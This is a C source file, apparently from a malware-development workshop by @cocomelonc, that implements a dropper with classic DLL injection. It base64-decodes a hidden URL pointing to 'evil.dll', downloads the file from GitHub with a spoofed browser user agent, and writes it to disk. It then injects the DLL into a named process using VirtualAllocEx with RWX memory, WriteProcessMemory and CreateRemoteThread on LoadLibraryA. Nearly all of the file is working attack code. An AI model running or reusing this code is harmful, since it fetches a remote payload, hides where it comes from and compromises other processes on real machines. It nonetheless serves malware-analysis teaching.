/*
example 2: current dir
classic DLL injection example
author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <wincrypt.h>

// #pragma comment (lib, "wininet.lib")
// #pragma comment (lib, "crypt32.lib")

void base64Decode(char* b64Message, char** message, DWORD* messageLen) {
  if (!CryptStringToBinaryA(b64Message, 0, CRYPT_STRING_BASE64, NULL, messageLen, NULL, NULL)) {
    // printf("error calculating the length of the decoded message. error: %d\n", GetLastError());
    exit(1);
  }

  *message = (char*)malloc(*messageLen + 1); // allocate an extra byte for null termination
  if (!CryptStringToBinaryA(b64Message, 0, CRYPT_STRING_BASE64, (BYTE*)*message, messageLen, NULL, NULL)) {
    // printf("error decoding the message. error: %d\n", GetLastError());
    exit(1);
  }
  (*message)[*messageLen] = '\0'; // Null terminate the decoded string
}

// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

// classic DLL injection logic
int main(int argc, char* argv[]) {
  int pid = 0;
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  char* b64Url = "aHR0cHM6Ly9naXRodWIuY29tL2NvY29tZWxvbmMvYnNwcmlzaHRpbmEtMjAyNC1tYWxkZXYtd29ya3Nob3AvcmF3L3JlZnMvaGVhZHMvbWFpbi8wMy1pbmplY3Rpb24vMDMtZHJvcHBlci9ldmlsLmRsbA==";
  char* evilUrl;
  DWORD messageLen;

  base64Decode(b64Url, &evilUrl, &messageLen);

  HINTERNET hSession = InternetOpen((LPCSTR)"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)evilUrl, 0, 0, 0, 0);
  DWORD dwFileSize = 1024;
  char* buffer = new char[dwFileSize + 1];
  DWORD dwBytesRead;
  DWORD dwBytesWritten;

  char currentPath[MAX_PATH];
  char evilDLL[MAX_PATH];
  DWORD length = GetCurrentDirectoryA(MAX_PATH, currentPath);
  snprintf(evilDLL, sizeof(evilDLL), "%s\\evil.dll", currentPath);
  unsigned int evilLen = sizeof(evilDLL) + 1;

  HANDLE hFile = CreateFile(evilDLL, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  do {
    buffer = new char[dwFileSize + 1];
    ZeroMemory(buffer, sizeof(buffer));
    InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);
    WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
    delete[] buffer;
    buffer = NULL;
  } while (dwBytesRead);

  CloseHandle(hFile);
  InternetCloseHandle(hHttpFile);
  InternetCloseHandle(hSession);

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);
  }

  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}